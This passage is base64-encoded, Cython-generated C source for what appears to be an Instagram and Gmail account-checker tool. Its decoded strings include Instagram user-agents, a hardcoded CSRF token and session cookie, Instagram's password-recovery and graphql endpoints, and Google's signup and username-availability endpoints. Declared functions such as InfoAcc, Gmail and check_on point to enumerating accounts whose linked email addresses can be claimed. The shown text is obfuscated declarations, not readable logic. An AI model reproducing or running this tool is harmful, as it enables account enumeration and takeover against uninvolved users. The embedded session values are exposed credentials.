jMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDAyMDEyZmIwYTMyOWJjYWZiM2IxZjRjMGJiNTZiMWYxZi57XCJfY3NyZnRva2VuXCI6XCI5eTNONWtMcXppYWxRQTd6OTZBTWl5QUtMTUJXcHFWalwiLFwiYWRpZFwiOlwiMGRmYWY4MjAtMjc0OC00NjM0LTkzNjUtYzNkOGM4MDExMjU2XCIsXCJndWlkXCI6XCIxZjc4NDQzMS0yNjYzLTRkYjktYjYyNC04NmJkOWNlMWQwODRcIixcImRldmljZV9pZFwiOlwiYW5kcm9pZC1iOTNkZGIzN2U5ODM0ODFjXCIsXCJxdWVyeVwiOlwiIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa181MGNjNjg2MV83MDM2XzQzYjRfODAyZV9mYjQyODI3OVtdID0gIjUwY2M2ODYxLTcwMzYtNDNiNC04MDJlLWZiNDI4Mjc5OWM2MCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmpbXSA9ICI5eTNONWtMcXppYWxRQTd6OTZBTWl5QUtMTUJXcHFWaiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfSW5zdGFncmFtXzEwMF8wXzBfMTdfMTI5X0FuZHJvaWRbXSA9ICJJbnN0YWdyYW0gMTAwLjAuMC4xNy4xMjkgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMTI5OyBzYW1zdW5nOyBTTS1NMjA1RjsgbTIwbHRlOyBleHlub3M3OTA0OyBlbl9HQjsgMTYxNDc4NjY0KSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfSW5zdGFncmFtXzMxMV8wXzBfMzJfMTE4X0FuZHJvaWRbXSA9ICJJbnN0YWdyYW0gMzExLjAuMC4zMi4xMTggQW5kcm9pZCAoIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19Qb2xhcmlzVXNlckhvdmVyQ2FyZENvbnRlbnRWMlF1ZVtdID0gIlBvbGFyaXNVc2VySG92ZXJDYXJkQ29udGVudFYyUXVlcnkiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlW10gPSAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkO2NoYXJzZXQ9VVRGLTgiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2F6ZXJ0eXVpb3BtbGtqaGdmZHNxd3hjdmJuQVpFUlRZW10gPSAiYXplcnR5dWlvcG1sa2poZ2Zkc3F3eGN2Ym5BWkVSVFlVSU9QTUxLSkhHRkRTUVdYQ1ZCTjEyMzQ1Njc4OTAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2M4MGM1ZmIzMGRmYWU5ZTI3M2U0MDA5ZjAzYjE4MjgwW10gPSAiYzgwYzVmYjMwZGZhZTllMjczZTQwMDlmMDNiMTgyODBiYjM0M2IwODYyZDY2M2YzMWEzYzYzZjEzYTlmMzFjMCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY29udGludWVfaHR0cHNfM0FfMkZfMkZtYWlsX2dvb2dbXSA9ICJjb250aW51ZT1odHRwcyUzQSUyRiUyRm1haWwuZ29vZ2xlLmNvbSUyRm1haWwlMkZ1JTJGMCUyRiZkZG09MCZmbG93RW50cnk9U2lnblVwJnNlcnZpY2U9bWFpbCZ0aGVtZT1tbiZmLnJlcT0lNUIlMjJUTCUzQSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZGF0YV9pbml0aWFsX3NldHVwX2RhdGFfbnVsbF9udWxbXSA9ICJkYXRhLWluaXRpYWwtc2V0dXAtZGF0YT1cIiUuQC5udWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCwmcXVvdDsoLio/KSZxdW90OyxudWxsLG51bGwsbnVsbCwmcXVvdDsoLio/KSYiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fX19zaWduW10gPSAiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL18vc2lnbnVwL3ZhbGlkYXRlcGVyc29uYWxkZXRhaWxzIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ25pbltdID0gImh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9zaWduaW4vdjIvdXNlcm5hbWVyZWNvdmVyeT9mbG93TmFtZT1HbGlmV2ViU2lnbkluJmZsb3dFbnRyeT1TZXJ2aWNlTG9naW4maGw9ZW4tR0IiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbnVwW10gPSAiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL3NpZ251cC92Mi9jcmVhdGVhY2NvdW50P3NlcnZpY2U9bWFpbCZjb250aW51ZT1odHRwcyUzQSUyRiUyRm1haWwuZ29vZ2xlLmNvbSUyRm1haWwlMkZ1JTJGMCUyRiZ0aGVtZT1tbiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaHR0cHNfaV9pbnN0YWdyYW1fY29tX2FwaV92MV9hY2NbXSA9ICJodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvYWNjb3VudHMvc2VuZF9yZWNvdmVyeV9mbG93X2VtYWlsLyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fYXBpX2dyYXBbXSA9ICJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FwaS9ncmFwaHFsIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc193d3dfaW5zdGFncmFtX2NvbV9jcmlzdGlhbltdID0gImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vY3Jpc3RpYW5vL2ZvbGxvd2luZy8iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX21pZF9aVmZHdmdBQkFBR29RcWE3QVkzbWdvWUJWMW5QW10gPSAibWlkPVpWZkd2Z0FCQUFHb1FxYTdBWTNtZ29ZQlYxblA7IGNzcmZ0b2tlbj05eTNONWtMcXppYWxRQTd6OTZBTWl5QUtMTUJXcHFWaiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDBfMltdID0gIjBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwMjAxMmZiMGEzMjliY2FmYjNiMWY0YzBiYjU2YjFmMWYuIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8yW10gPSAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8zW10gPSAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbl8yW10gPSAiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL18vc2lnbnVwL3VzZXJuYW1lYXZhaWxhYmlsaXR5IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cF8yW10gPSAiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL3NpZ251cC92Mi9jcmVhdGV1c2VybmFtZT9zZXJ2aWNlPW1haWwmY29udGludWU9aHR0cHMlM0ElMkYlMkZtYWlsLmdvb2dsZS5jb20lMkZtYWlsJTJGdSUyRjAlMkYmcGFyZW50X2RpcmVjdGVkPXRydWUmdGhlbWU9bW4mZGRtPTAmZmxvd05hbWU9R2xpZldlYlNpZ25JbiZmbG93RW50cnk9U2lnblVwJlRMPSI7CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJuZV9wcHBwKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfM3RsbF9nZW5leHByKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5lXzN0bGxfM2dlbmV4cHIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzApOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfM3RsbF82Z2VuZXhwcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJuZV8ydGxsKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfNHJlc3QoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcik7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJuZV82ZGF0ZShDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9JZCk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJuZV84SW5mb0FjYyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9nZyk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJuZV8xMEdtYWlsKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5lXzEyZm9ybWF0X251bWJlcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl92YWx1ZSk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJuZV8xNGNoZWNrX29uKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5lXzE2cmFuZF9pZHMoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfYmJrLCBQeU9iamVjdCAqX19weXhfdl9JZG8pOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfM3V1dV9nZW5leHByKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfMTh1dXUoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZik7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJuZV8yMHByaW50aW5nKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcihQeVR5cGVPYmplY3QgKnQsIFB5T2JqZWN0ICphLCBQeU9iamVjdCAqayk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcihQeVR5cGVPYmplY3QgKnQsIFB5T2JqZWN0ICphLCBQeU9iamVjdCAqayk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcihQeVR5cGVPYmplY3QgKnQsIFB5T2JqZWN0ICphLCBQeU9iamVjdCAqayk7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcihQeVR5cGVPYmplY3QgKnQsIFB5T2JqZWN0ICphLCBQeU9iamVjdCAqayk7IAoKCgojaWZuZGVmIENZVEhPTl9TTUFMTF9DT0RFCiNpZiBkZWZpbmVkKF9fY2xhbmdfXykKICAgICNkZWZpbmUgQ1lUSE9OX1NNQUxMX0NPREUKI2VsaWYgZGVmaW5lZChfX0dOVUNfXykgJiYgKF9fR05VQ19fID4gNCB8fCAoX19HTlVDX18gPT0gNCAmJiBfX0dOVUNfTUlOT1JfXyA+PSAzKSkKICAgICNkZWZpbmUgQ1lUSE9OX1NNQUxMX0NPREUgX19hdHRyaWJ1dGVfXygoY29sZCkpCiNlbHNlCiAgICAjZGVmaW5lIENZVEhPTl9TTUFMTF9DT0RFCiNlbmRpZgojZW5kaWYKCnR5cGVkZWYgc3RydWN0IHsKICBQeU9iamVjdCAqX19weXhfZDsKICBQeU9iamVjdCAqX19weXhfYjsKICBQeU9iamVjdCAqX19weXhfY3l0aG9uX3J1bnRpbWU7CiAgUHlPYmplY3QgKl9fcHl4X2VtcHR5X3R1cGxlOwogIFB5T2JqZWN0ICpfX3B5eF9lbXB0eV9ieXRlczsKICBQeU9iamVjdCAqX19weXhfZW1wdHlfdW5pY29kZTsKICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VECiAgUHlUeXBlT2JqZWN0ICpfX3B5eF9DeUZ1bmN0aW9uVHlwZTsKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfRnVzZWRGdW5jdGlvbl9VU0VECiAgUHlUeXBlT2JqZWN0ICpfX3B5eF9GdXNlZEZ1bmN0aW9uVHlwZTsKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRUQKICBQeVR5cGVPYmplY3QgKl9fcHl4X0dlbmVyYXRvclR5cGU7CiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0l0ZXJhYmxlQ29yb3V0aW5lX1VTRUQKICBQeVR5cGVPYmplY3QgKl9fcHl4X0l0ZXJhYmxlQ29yb3V0aW5lVHlwZTsKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRUQKICBQeVR5cGVPYmplY3QgKl9fcHl4X0Nvcm91dGluZUF3YWl0VHlwZTsKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRUQKICBQeVR5cGVPYmplY3QgKl9fcHl4X0Nvcm91dGluZVR5cGU7CiAgI2VuZGlmCiAgUHlPYmplY3QgKl9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcjsKICBQeU9iamVjdCAqX19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcjsKICBQeU9iamVjdCAqX19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcjsKICBQeU9iamVjdCAqX19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcjsKICBQeVR5cGVPYmplY3QgKl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHI7CiAgUHlUeXBlT2JqZWN0ICpfX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcjsKICBQeVR5cGVPYmplY3QgKl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByOwogIFB5VHlwZU9iamVjdCAqX19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHI7CiAgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uIF9fcHl4X3VtZXRob2RfUHlEaWN0X1R5cGVfcG9wOwogIFB5T2JqZWN0ICpfX3B5eF9zbGljZVsxXTsKICBQeU9iamVjdCAqX19weXhfdHVwbGVbMjRdOwogIFB5T2JqZWN0ICpfX3B5eF9jb2Rlb2JqX3RhYlsxNV07CiAgUHlPYmplY3QgKl9fcHl4X3N0cmluZ190YWJbMzgwXTsKICBQeU9iamVjdCAqX19weXhfaW50XzA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjsKICBQeU9iamVjdCAqX19weXhfaW50XzM7CiAgUHlPYmplY3QgKl9fcHl4X2ludF81OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfNjsKICBQeU9iamVjdCAqX19weXhfaW50Xzk7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xMDsKICBQeU9iamVjdCAqX19weXhfaW50XzExOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTU7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xNjsKICBQeU9iamVjdCAqX19weXhfaW50XzMwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTExOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTUwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjA4OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfOTk5OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTAwMDsKICBQeU9iamVjdCAqX19weXhfaW50XzEzMDA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAxMDsKICBQeU9iamVjdCAqX19weXhfaW50XzIwMTE7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDEyOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAxMzsKICBQeU9iamVjdCAqX19weXhfaW50XzIwMTQ7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDE1OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAxNjsKICBQeU9iamVjdCAqX19weXhfaW50XzIwMTc7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMDE4OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjAxOTsKICBQeU9iamVjdCAqX19weXhfaW50XzEwMDAwMDA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xMjc5MDAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTI3OTAwMTsKICBQeU9iamVjdCAqX19weXhfaW50XzE3NzUwMDAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTc3NTAwMDE7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yNzk3NjAwMDA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yNzk3NjAwMDE7CiAgUHlPYmplY3QgKl9fcHl4X2ludF85MDA5OTAwMDA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF85MDA5OTAwMDE7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8xNjI5MDEwMDAwOwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfMTkwMDAwMDAwMDsKICBQeU9iamVjdCAqX19weXhfaW50XzI1MDAwMDAwMDA7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8zNzEzNjY4Nzg2OwogIFB5T2JqZWN0ICpfX3B5eF9pbnRfNTY5OTc4NTIxNzsKICBQeU9iamVjdCAqX19weXhfaW50Xzg1MDc5NDA2MzQ7CiAgUHlPYmplY3QgKl9fcHl4X2ludF8yMTI1NDAyOTgzNDsKCgojaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICpfX3B5eF9mcmVlbGlzdF8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByWzhdOwppbnQgX19weXhfZnJlZWNvdW50XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHI7CiNlbmRpZgoKI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCnN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKl9fcHl4X2ZyZWVsaXN0XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByWzhdOwppbnQgX19weXhfZnJlZWNvdW50XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByOwojZW5kaWYKCiNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwpzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICpfX3B5eF9mcmVlbGlzdF8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcls4XTsKaW50IF9fcHl4X2ZyZWVjb3VudF8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcjsKI2VuZGlmCgojaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqX19weXhfZnJlZWxpc3RfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJbOF07CmludCBfX3B5eF9mcmVlY291bnRfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHI7CiNlbmRpZgoKUHlUeXBlT2JqZWN0ICpfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc1R5cGU7CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKUHlPYmplY3QgKl9fUHl4X0NhY2hlZE1ldGhvZFR5cGU7CiNlbmRpZgoKCnN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgX19weXhfY29kZV9jYWNoZTsKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMApQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSV9jYWNoZTsKI2VuZGlmCgoKfSBfX3B5eF9tc3RhdGV0eXBlOwoKI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiNpZmRlZiBfX2NwbHVzcGx1cwpuYW1lc3BhY2UgewpleHRlcm4gc3RydWN0IFB5TW9kdWxlRGVmIF9fcHl4X21vZHVsZWRlZjsKfSAKI2Vsc2UKc3RhdGljIHN0cnVjdCBQeU1vZHVsZURlZiBfX3B5eF9tb2R1bGVkZWY7CiNlbmRpZgoKI2RlZmluZSBfX3B5eF9tc3RhdGVfZ2xvYmFsIChfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlKCZfX3B5eF9tb2R1bGVkZWYpKSkKCiNkZWZpbmUgX19weXhfbSAoX19QeXhfU3RhdGVfRmluZE1vZHVsZSgmX19weXhfbW9kdWxlZGVmKSkKI2Vsc2UKc3RhdGljIF9fcHl4X21zdGF0ZXR5cGUgX19weXhfbXN0YXRlX2dsb2JhbF9zdGF0aWMgPQojaWZkZWYgX19jcGx1c3BsdXMKICAgIHt9OwojZWxzZQogICAgezB9OwojZW5kaWYKc3RhdGljIF9fcHl4X21zdGF0ZXR5cGUgKiBjb25zdCBfX3B5eF9tc3RhdGVfZ2xvYmFsID0gJl9fcHl4X21zdGF0ZV9nbG9iYWxfc3RhdGljOwojZW5kaWYKCiNkZWZpbmUgX19weXhfa3BfdV8gX19weXhfc3RyaW5nX3RhYlswXQojZGVmaW5lIF9fcHl4X2twX3VfMCBfX3B5eF9zdHJpbmdfdGFiWzFdCiNkZWZpbmUgX19weXhfa3BfdV8wXzBfbnVsbF9udWxsX3dlYl9nbGlmX3NpZ251cF8wIF9fcHl4X3N0cmluZ190YWJbMl0KI2RlZmluZSBfX3B5eF9rcF91XzBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwIF9fcHl4X3N0cmluZ190YWJbM10KI2RlZmluZSBfX3B5eF9rcF91XzBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwXzIgX19weXhfc3RyaW5nX3RhYls0XQojZGVmaW5lIF9fcHl4X2twX3VfMSBfX3B5eF9zdHJpbmdfdGFiWzVdCiNkZWZpbmUgX19weXhfa3BfdV8xNzAwMjUxNTc0Xzk4MiBfX3B5eF9zdHJpbmdfdGFiWzZdCiNkZWZpbmUgX19weXhfa3BfdV8xXzAwMCBfX3B5eF9zdHJpbmdfdGFiWzddCiNkZWZpbmUgX19weXhfa3BfdV8xXzM5bSBfX3B5eF9zdHJpbmdfdGFiWzhdCiNkZWZpbmUgX19weXhfa3BfdV8xZiBfX3B5eF9zdHJpbmdfdGFiWzldCiNkZWZpbmUgX19weXhfa3BfdV8xa2JwcyBfX3B5eF9zdHJpbmdfdGFiWzEwXQojZGVmaW5lIF9fcHl4X2twX3VfMjAyMF8yMDIzIF9fcHl4X3N0cmluZ190YWJbMTFdCiNkZWZpbmUgX19weXhfa3BfdV8yMl8yQzBfMkMwXzJDMV8yQ251bGxfMkMwXzJDNTE2IF9fcHl4X3N0cmluZ190YWJbMTJdCiNkZWZpbmUgX19weXhfa3BfdV8yMl8yQ18yMiBfX3B5eF9zdHJpbmdfdGFiWzEzXQojZGVmaW5lIF9fcHl4X2twX3VfMjNfNl8wIF9fcHl4X3N0cmluZ190YWJbMTRdCiNkZWZpbmUgX19weXhfa3BfdV8yNF83XzAgX19weXhfc3RyaW5nX3RhYlsxNV0KI2RlZmluZSBfX3B5eF9rcF91XzI1XzdfMV8xIF9fcHl4X3N0cmluZ190YWJbMTZdCiNkZWZpbmUgX19weXhfa3BfdV8yNl84XzAgX19weXhfc3RyaW5nX3RhYlsxN10KI2RlZmluZSBfX3B5eF9rcF91XzI3XzhfMSBfX3B5eF9zdHJpbmdfdGFiWzE4XQojZGVmaW5lIF9fcHl4X2twX3VfMjhfOV8wIF9fcHl4X3N0cmluZ190YWJbMTldCiNkZWZpbmUgX19weXhfa3BfdV8zNTYgX19weXhfc3RyaW5nX3RhYlsyMF0KI2RlZmluZSBfX3B5eF9rcF91XzM4XzUgX19weXhfc3RyaW5nX3RhYlsyMV0KI2RlZmluZSBfX3B5eF9rcF91XzNiclR2dyBfX3B5eF9zdHJpbmdfdGFiWzIyXQojZGVmaW5lIF9fcHl4X2twX3VfNCBfX3B5eF9zdHJpbmdfdGFiWzIzXQojZGVmaW5lIF9fcHl4X2twX3VfNTBjYzY4NjFfNzAzNl80M2I0XzgwMmVfZmI0MjgyNzkgX19weXhfc3RyaW5nX3RhYlsyNF0KI2RlZmluZSBfX3B5eF9rcF91XzU2NzA2NzM0MzM1MjQyNyBfX3B5eF9zdHJpbmdfdGFiWzI1XQojZGVmaW5lIF9fcHl4X2twX3VfNzcxNzI2OTQ4ODMzNjAwMSBfX3B5eF9zdHJpbmdfdGFiWzI2XQojZGVmaW5lIF9fcHl4X2twX3VfOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmogX19weXhfc3RyaW5nX3RhYlsyN10KI2RlZmluZSBfX3B5eF9uX3VfQVNVUyBfX3B5eF9zdHJpbmdfdGFiWzI4XQojZGVmaW5lIF9fcHl4X2twX3VfQWNjZXB0X0VuY29kaW5nIF9fcHl4X3N0cmluZ190YWJbMjldCiNkZWZpbmUgX19weXhfa3BfdV9BY2NlcHRfTGFuZ3VhZ2UgX19weXhfc3RyaW5nX3RhYlszMF0KI2RlZmluZSBfX3B5eF9rcF91X0FjY291bnRfWWVhciBfX3B5eF9zdHJpbmdfdGFiWzMxXQojZGVmaW5lIF9fcHl4X2twX3VfQmFkIF9fcHl4X3N0cmluZ190YWJbMzJdCiNkZWZpbmUgX19weXhfbl91X0JlYXV0aWZ1bFNvdXAgX19weXhfc3RyaW5nX3RhYlszM10KI2RlZmluZSBfX3B5eF9rcF91X0JpbyBfX3B5eF9zdHJpbmdfdGFiWzM0XQojZGVmaW5lIF9fcHl4X2twX3VfQnVzaW5lc3NfQWNjIF9fcHl4X3N0cmluZ190YWJbMzVdCiNkZWZpbmUgX19weXhfbl91X0Nvbm5lY3Rpb24gX19weXhfc3RyaW5nX3RhYlszNl0KI2RlZmluZSBfX3B5eF9uX3VfQ29uc29sZSBfX3B5eF9zdHJpbmdfdGFiWzM3XQojZGVmaW5lIF9fcHl4X2twX3VfQ29udGVudF9MZW5ndGggX19weXhfc3RyaW5nX3RhYlszOF0KI2